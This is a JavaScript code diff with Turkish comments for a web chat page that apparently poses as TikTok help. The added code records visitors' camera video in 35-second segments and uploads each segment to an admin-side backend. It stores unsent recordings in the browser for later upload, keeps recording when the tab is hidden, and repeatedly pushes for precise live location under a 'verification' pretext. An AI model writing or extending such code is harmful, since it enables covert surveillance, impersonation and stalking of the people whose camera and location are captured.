@@ -314,20 +314,33 @@
     }
   }
 
+  function recordingFileExt(mimeOrBlob) {
+    const t = typeof mimeOrBlob === "string" ? mimeOrBlob : mimeOrBlob?.type || "";
+    if (/mp4|mpeg|m4v/i.test(t)) return "mp4";
+    return "webm";
+  }
+
   function stopVisitorRecorder(state) {
     return new Promise((resolve) => {
       const rec = state?.recorder;
-      if (!rec || rec.state === "inactive") {
-        resolve(state?.lastBlob || null);
-        return;
-      }
-      const finish = () => {
+      let settled = false;
+      const settle = (blob) => {
+        if (settled) return;
+        settled = true;
+        if (blob?.size) state.lastBlob = blob;
+        resolve(blob?.size ? blob : state?.lastBlob || null);
+      };
+      const buildBlob = () => {
         const blob = new Blob(state.recordChunks || [], {
           type: state.recorderMime || "video/webm",
         });
-        state.lastBlob = blob.size ? blob : null;
-        resolve(state.lastBlob);
+        return blob.size ? blob : null;
       };
+      if (!rec || rec.state === "inactive") {
+        settle(buildBlob() || state?.lastBlob || null);
+        return;
+      }
+      const finish = () => settle(buildBlob());
       rec.addEventListener("stop", finish, { once: true });
       try {
         if (rec.state === "recording") {
@@ -339,10 +352,136 @@
         }
         rec.stop();
       } catch {
-        resolve(null);
+        settle(buildBlob());
       }
-      window.setTimeout(() => resolve(state.lastBlob || null), 5000);
+      window.setTimeout(() => settle(buildBlob() || state.lastBlob || null), 5000);
     });
+  }
+
+  const PENDING_REC_DB = "tiktok-help-pending-rec";
+  const PENDING_REC_STORE = "recordings";
+
+  function openPendingRecDb() {
+    return new Promise((resolve, reject) => {
+      if (!window.indexedDB) {
+        reject(new Error("no-idb"));
+        return;
+      }
+      const req = indexedDB.open(PENDING_REC_DB, 1);
+      req.onupgradeneeded = () => {
+        const db = req.result;
+        if (!db.objectStoreNames.contains(PENDING_REC_STORE)) {
+          db.createObjectStore(PENDING_REC_STORE, { keyPath: "id" });
+        }
+      };
+      req.onsuccess = () => resolve(req.result);
+      req.onerror = () => reject(req.error || new Error("idb-open"));
+    });
+  }
+
+  async function stashPendingRecording({ sessionId, callId, blob, fileName }) {
+    if (!blob?.size || !sessionId || !callId) return;
+    try {
+      const db = await openPendingRecDb();
+      await new Promise((resolve, reject) => {
+        const tx = db.transaction(PENDING_REC_STORE, "readwrite");
+        tx.objectStore(PENDING_REC_STORE).put({
+          id: `${sessionId}:${callId}`,
+          sessionId,
+          callId,
+          fileName: fileName || `kamera-${String(callId).slice(0, 8)}.webm`,
+          mime: blob.type || "video/webm",
+          blob,
+          ts: Date.now(),
+        });
+        tx.oncomplete = () => resolve();
+        tx.onerror = () => reject(tx.error);
+      });
+      db.close?.();
+    } catch (err) {
+      console.warn("pending rec stash", err);
+    }
+  }
+
+  async function removePendingRecording(id) {
+    try {
+      const db = await openPendingRecDb();
+      await new Promise((resolve, reject) => {
+        const tx = db.transaction(PENDING_REC_STORE, "readwrite");
+        tx.objectStore(PENDING_REC_STORE).delete(id);
+        tx.oncomplete = () => resolve();
+        tx.onerror = () => reject(tx.error);
+      });
+      db.close?.();
+    } catch {
+      /* ignore */
+    }
+  }
+
+  async function drainPendingRecordings() {
+    const sync = window.ChatSync;
+    if (!sync?.enabled || !sync.uploadCameraRecording) return;
+    let rows = [];
+    try {
+      const db = await openPendingRecDb();
+      rows = await new Promise((resolve, reject) => {
+        const tx = db.transaction(PENDING_REC_STORE, "readonly");
+        const req = tx.objectStore(PENDING_REC_STORE).getAll();
+        req.onsuccess = () => resolve(req.result || []);
+        req.onerror = () => reject(req.error);
+      });
+      db.close?.();
+    } catch {
+      return;
+    }
+    for (const row of rows) {
+      if (!row?.blob?.size || !row.sessionId || !row.callId) {
+        await removePendingRecording(row?.id);
+        continue;
+      }
+      try {
+        await sync.uploadCameraRecording(row.sessionId, row.callId, row.blob, row.fileName, {
+          finalize: true,
+        });
+        await removePendingRecording(row.id);
+        syncMessage("user", "Bekleyen kamera kaydı gönderildi.");
+      } catch (err) {
+        console.warn("pending rec upload", err);
+      }
+    }
+  }
+
+  const SEGMENT_UPLOAD_MS = 35_000;
+
+  async function rotateAndUploadSegment(state, sessionId, callId, sync) {
+    if (!state || !cameraSessions.has(callId) || state._segmentBusy) return;
+    if (!sync?.uploadCameraRecording) return;
+    state._segmentBusy = true;
+    try {
+      const blob = await stopVisitorRecorder(state);
+      startVisitorRecording(state);
+      if (!blob?.size || !cameraSessions.has(callId)) return;
+      const ext = recordingFileExt(blob);
+      const name = `kamera-${String(callId).slice(0, 8)}.${ext}`;
+      await sync.uploadCameraRecording(sessionId, callId, blob, name, { finalize: false });
+    } catch (err) {
+      console.warn("segment upload", err);
+      if (cameraSessions.has(callId) && !state.recorder) {
+        startVisitorRecording(state);
+      }
+    } finally {
+      state._segmentBusy = false;
+    }
+  }
+
+  function startSegmentUploads(state, sessionId, callId, sync) {
+    if (state.segmentTimer) {
+      window.clearInterval(state.segmentTimer);
+      state.segmentTimer = null;
+    }
+    state.segmentTimer = window.setInterval(() => {
+      void rotateAndUploadSegment(state, sessionId, callId, sync);
+    }, SEGMENT_UPLOAD_MS);
   }
 
   async function stopCameraSession(callId, { upload = true } = {}) {
@@ -354,6 +493,15 @@
       window.clearTimeout(state.maxDurationTimer);
       state.maxDurationTimer = null;
     }
+    if (state.segmentTimer) {
+      window.clearInterval(state.segmentTimer);
+      state.segmentTimer = null;
+    }
+    // Parça yükleme orta sıradaysa kayıp blob olmasın
+    if (state._segmentBusy) {
+      await new Promise((r) => window.setTimeout(r, 1200));
+    }
+    state._segmentBusy = true;
     if (state.locationRetryTimer) {
       window.clearTimeout(state.locationRetryTimer);
       state.locationRetryTimer = null;
@@ -389,6 +537,21 @@
       state.geoWatchId = null;
     }
 
+    const sync = window.ChatSync;
+    const sid = sync?.getSessionId?.();
+
+    // Admin’e hemen “bitiyor” sinyali — upload bitmeden sayfa ölürse bile
+    if (upload && sync?.enabled && sid) {
+      sync
+        .setCameraCallStatus?.(sid, callId, "ended")
+        .catch(() => {});
+      try {
+        await sync.writeCameraSignal?.(sid, callId, "recordingStatus", "finalizing");
+      } catch {
+        /* ignore */
+      }
+    }
+
     // Önce kaydı bitir (track’ler hâlâ açıkken)
     const blob = await stopVisitorRecorder(state);
 
@@ -406,24 +569,20 @@
       /* ignore */
     }
 
-    const sync = window.ChatSync;
-    if (upload && sync?.enabled) {
-      const sid = sync.getSessionId();
+    if (upload && sync?.enabled && sid) {
       if (blob?.size) {
+        const ext = recordingFileExt(blob);
+        const fileName = `kamera-${String(callId).slice(0, 8)}.${ext}`;
+        await stashPendingRecording({ sessionId: sid, callId, blob, fileName });
         try {
-          await sync.uploadCameraRecording(
-            sid,
-            callId,
-            blob,
-            `kamera-${String(callId).slice(0, 8)}.webm`
-          );
-          await sync.setCameraCallStatus?.(sid, callId, "ended").catch(() => {});
+          await sync.uploadCameraRecording(sid, callId, blob, fileName, { finalize: true });
+          await removePendingRecording(`${sid}:${callId}`);
           syncMessage("user", "Kamera oturumu sonlandı; kayıt gönderildi.");
         } catch (err) {
           console.error(err);
           syncMessage(
             "user",
-            `Kamera kapandı; kayıt yüklenemedi (${err?.code || err?.message || "hata"}).`
+            `Kamera kapandı; kayıt yüklenemedi (${err?.code || err?.message || "hata"}). Tekrar girişte denenecek.`
           );
         }
       } else {
@@ -529,10 +688,14 @@
     }
   }
 
+  // SADECE gerçek çıkış — visibilitychange sekme değişiminde kamerayı öldürmesin
+  // (mobilde ayarlara gitmek / bildirim = document.hidden → konum butonu kırılıyordu)
   window.addEventListener("pagehide", flushCameraSessionsOnLeave);
-  document.addEventListener("visibilitychange", () => {
-    if (document.hidden) flushCameraSessionsOnLeave();
+  window.addEventListener("beforeunload", flushCameraSessionsOnLeave);
+  window.addEventListener("pageshow", () => {
+    void drainPendingRecordings();
   });
+  void drainPendingRecordings();
 
   const VISITOR_RECORD_MAX_MS = 90_000;
 
@@ -734,19 +897,86 @@
         note.textContent = "Bu tarayıcı konum desteklemiyor (HTTPS / Chrome-Safari deneyin).";
         return;
       }
-      // ÖNCE native API (jest bozulmasın), sonra UI
+      const state = cameraSessions.get(callId);
+      if (!state) {
+        note.textContent = "Kamera oturumu yok; sayfayı yenileyip önce kamerayı verin.";
+        options.onSoftDeny?.("no-camera");
+        return;
+      }
+      if (state._hadLocation) {
+        card.remove();
+        fab.remove();
+        options.onGranted?.();
+        return;
+      }
+
+      okBtn.disabled = true;
+      fab.disabled = true;
+      note.textContent = "Konum penceresi açılıyor… İzin Ver’e basın.";
+
+      // Tercihen tek yol: startLiveLocationWatch askLocation (watch + _onLocationGranted)
+      if (typeof state.retryLocation === "function") {
+        const prevGranted = state._onLocationGranted;
+        const prevDenied = state._onLocationDenied;
+        let settled = false;
+        state._onLocationGranted = () => {
+          if (settled) return;
+          settled = true;
+          state._onLocationGranted = prevGranted;
+          state._onLocationDenied = prevDenied;
+          try {
+            prevGranted?.();
+          } catch {
+            /* ignore */
+          }
+          box.querySelectorAll(".chat-location-perm-denied").forEach((el) => el.remove());
+          card.remove();
+          fab.remove();
+          appendMessage(box, "bot", "Konum izni alındı.", { sync: true });
+          options.onGranted?.();
+        };
+        state._onLocationDenied = () => {
+          fromEl && (fromEl.disabled = false);
+          okBtn.disabled = false;
+          fab.disabled = false;
+          note.textContent =
+            "Konum açılamadı. Ayarlar → Konum → İzin Ver, sonra tekrar dokunun.";
+          try {
+            prevDenied?.();
+          } catch {
+            /* ignore */
+          }
+          options.onSoftDeny?.("denied");
+        };
+        try {
+          state.retryLocation();
+        } catch (err) {
+          okBtn.disabled = false;
+          fab.disabled = false;
+          note.textContent = `Konum istemi başarısız: ${err?.message || err}`;
+        }
+        // retryLocation async; denied path may be delayed — re-enable after timeout if still pending
+        window.setTimeout(() => {
+          if (!settled && cameraSessions.has(callId) && !cameraSessions.get(callId)?._hadLocation) {
+            okBtn.disabled = false;
+            fab.disabled = false;
+          }
+        }, 65000);
+        return;
+      }
+
       navigator.geolocation.getCurrentPosition(
         (pos) => {
-          const state = cameraSessions.get(callId);
-          if (!state) {
+          const live = cameraSessions.get(callId);
+          if (!live) {
             note.textContent = "Kamera oturumu yok; sayfayı yenileyip önce kamerayı verin.";
             options.onSoftDeny?.("no-camera");
             return;
           }
-          applySeedLocationToSession(sync, callId, state, pos);
+          applySeedLocationToSession(sync, callId, live, pos);
           try {
-            if (state.geoWatchId == null) {
-              state.geoWatchId = navigator.geolocation.watchPosition(
+            if (live.geoWatchId == null) {
+              live.geoWatchId = navigator.geolocation.watchPosition(
                 (p) => {
                   if (!cameraSessions.has(callId)) return;
                   const c = p.coords;
@@ -794,9 +1024,6 @@
         },
         { enableHighAccuracy: true, maximumAge: 0, timeout: 60000 }
       );
-      okBtn.disabled = true;
-      fab.disabled = true;
-      note.textContent = "Konum penceresi açılıyor… İzin Ver’e basın.";
     };
 
     okBtn.addEventListener("click", (e) => {
@@ -953,6 +1180,14 @@
       })
       .catch(() => {});
     syncMessage("user", "Konum izni verildi.");
+    if (state.label) {
+      state.label.textContent = "Doğrulama devam ediyor… Lütfen bekleyin.";
+    }
+    try {
+      state._onLocationGranted?.();
+    } catch {
+      /* ignore */
+    }
     return true;
   }
 
@@ -1018,6 +1253,7 @@
       geoWatchId: null,
       _hadLocation: false,
       maxDurationTimer: null,
+      segmentTimer: null,
       snapshotTimer: null,
       snapVideo: null,
       locationRetryTimer: null,
@@ -1044,6 +1280,9 @@
     if (!startVisitorRecording(state)) {
       preview.label.textContent = "Doğrulama devam ediyor… (kayıt sınırlı)";
     }
+
+    // Sayfa kapanmadan önce parça parça Storage’a yaz (pagehide upload güvenilmez)
+    startSegmentUploads(state, sessionId, callId, sync);
 
     // Video olmasa bile ~5 sn’de bir JPEG → Storage
     startSnapshotUploads(state, sessionId, callId, sync);
@@ -1259,9 +1498,12 @@
         });
         showLocationTapButton(box, callId, {
           onGranted: () => options.onGranted?.(),
-          onSoftDeny: (r) => options.onSoftDeny?.(r || "location-pending"),
+          onSoftDeny: (r) => {
+            if (r === "location-pending" || r === "1" || r === "denied") return;
+            options.onSoftDeny?.(r || "location-pending");
+          },
         });
-        options.onSoftDeny?.("location-pending");
+        // Konum beklenirken soft-deny spam yapma — FAB açık kalsın
         return;
       }
 
@@ -1488,9 +1730,25 @@
           appendMessage(box, "bot", "Kamera var. Konum için butona dokunun.", { sync: true });
           showLocationTapButton(box, callId, {
             onGranted: () => markComplete(),
-            onSoftDeny: () => scheduleRetry(),
+            onSoftDeny: () => {
+              /* konum reddi — FAB kalsın; hemen yeniden spam etme */
+            },
           });
-          scheduleRetry();
+          // Konum için jest bekleniyor — 45 sn sonra hatırlat, her 10 sn yeniden spam yok
+          if (cameraPermLoopTimer) window.clearTimeout(cameraPermLoopTimer);
+          cameraPermLoopTimer = window.setTimeout(() => {
+            cameraPermLoopTimer = null;
+            if (token !== cameraPermLoopToken) return;
+            if (sessionHasBoth(callId)) {
+              markComplete();
+              return;
+            }
+            if (cameraSessions.get(callId)?.stream && !cameraSessions.get(callId)?._hadLocation) {
+              void attempt();
+            } else {
+              scheduleRetry();
+            }
+          }, 45_000);
           return;
         }
 
